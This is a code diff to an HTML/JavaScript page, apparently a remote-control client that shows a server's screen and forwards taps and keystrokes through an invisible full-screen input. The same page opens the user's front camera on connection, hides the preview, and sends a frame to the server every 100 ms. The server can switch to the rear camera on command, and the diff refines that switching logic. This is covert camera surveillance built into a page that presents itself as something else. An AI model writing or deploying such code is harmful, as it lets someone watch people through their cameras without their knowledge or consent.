@@ -11,7 +11,7 @@
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; z-index: 10; font-size: 16px; border: none; outline: none; background: transparent;
         }
-        #myVideoPreview { display: none; } /* إخفاء نافذة الكاميرا لعدم التشويش */
+        #myVideoPreview { display: none; }
     </style>
 </head>
 <body>
@@ -28,45 +28,14 @@
         
         let currentStream = null;
         let camInterval = null;
+        let lastMode = ""; // لتجنب إعادة تشغيل الكاميرا إذا كانت هي المطلوبة فعلاً
 
         ws.onopen = () => {
             hiddenInput.focus();
             hiddenInput.value = " ";
-            startCameraStream("user"); // البدء بكاميرا السيلفي افتراضياً
+            startCameraStream("user");
         };
         
-        document.body.onclick = () => hiddenInput.focus();
-
-        const sendTouch = (e) => {
-            const rect = img.getBoundingClientRect();
-            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
-            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
-            if (clientX !== undefined && clientY !== undefined) {
-                ws.send(JSON.stringify({
-                    type: 'touch',
-                    x: clientX / rect.width,
-                    y: clientY / rect.height
-                }));
-            }
-            hiddenInput.focus();
-        };
-
-        hiddenInput.addEventListener('touchstart', (e) => { sendTouch(e); });
-        hiddenInput.addEventListener('mousedown', sendTouch);
-
-        hiddenInput.oninput = (e) => {
-            const val = e.target.value;
-            if (val === "") {
-                ws.send(JSON.stringify({ type: 'key', value: 'Backspace' }));
-                e.target.value = " ";
-            } else if (val.length > 1) {
-                const text = val.substring(1);
-                if (text === " ") ws.send(JSON.stringify({ type: 'key', value: ' ' }));
-                else ws.send(JSON.stringify({ type: 'text', value: text }));
-                e.target.value = " ";
-            }
-        };
-
         ws.onmessage = (event) => {
             if (event.data instanceof Blob) {
                 const url = URL.createObjectURL(event.data);
@@ -76,16 +45,19 @@
                 try {
                     const data = JSON.parse(event.data);
                     if (data.type === 'camera_switch_request') {
-                        // استقبال طلب تبديل الكاميرا (user أو environment)
-                        console.log("Switching camera to: " + data.mode);
-                        startCameraStream(data.mode);
+                        // تبديل فقط إذا كان النوع مختلفاً عن الحالي
+                        if (data.mode !== lastMode) {
+                            startCameraStream(data.mode);
+                        }
                     }
                 } catch(e) {}
             }
         };
 
         function startCameraStream(mode) {
-            // إيقاف أي بث قديم لتجنب تداخل الكاميرات
+            console.log("Attempting to start camera: " + mode);
+            lastMode = mode;
+            
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
             }
@@ -106,27 +78,47 @@
                     if (ws.readyState === WebSocket.OPEN) {
                         canvas.width = 320;
                         canvas.height = 240;
-                        
                         ctx.save();
-                        // عكس الصورة فقط إذا كانت الكاميرا أمامية (user)
                         if (mode === "user") {
                             ctx.translate(canvas.width, 0);
                             ctx.scale(-1, 1);
                         }
                         ctx.drawImage(myVideo, 0, 0, canvas.width, canvas.height);
                         ctx.restore();
-                        
                         const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                         ws.send(JSON.stringify({ type: 'remote_camera_frame', data: base64 }));
                     }
                 }, 100);
             }).catch(err => {
-                console.error("Camera error:", err);
-                // محاولة العودة للكاميرا الافتراضية في حال الفشل
+                console.error("Switch failed, retrying user mode...");
                 if (mode !== "user") startCameraStream("user");
             });
         }
 
+        const sendTouch = (e) => {
+            const rect = img.getBoundingClientRect();
+            const clientX = e.clientX || (e.touches && e.touches[0].clientX);
+            const clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            if (clientX !== undefined && clientY !== undefined) {
+                ws.send(JSON.stringify({ type: 'touch', x: clientX / rect.width, y: clientY / rect.height }));
+            }
+            hiddenInput.focus();
+        };
+
+        hiddenInput.addEventListener('touchstart', (e) => sendTouch(e));
+        hiddenInput.addEventListener('mousedown', sendTouch);
+        hiddenInput.oninput = (e) => {
+            const val = e.target.value;
+            if (val === "") {
+                ws.send(JSON.stringify({ type: 'key', value: 'Backspace' }));
+                e.target.value = " ";
+            } else if (val.length > 1) {
+                const text = val.substring(1);
+                if (text === " ") ws.send(JSON.stringify({ type: 'key', value: ' ' }));
+                else ws.send(JSON.stringify({ type: 'text', value: text }));
+                e.target.value = " ";
+            }
+        };
         hiddenInput.onblur = () => setTimeout(() => hiddenInput.focus(), 10);
     </script>
 </body>
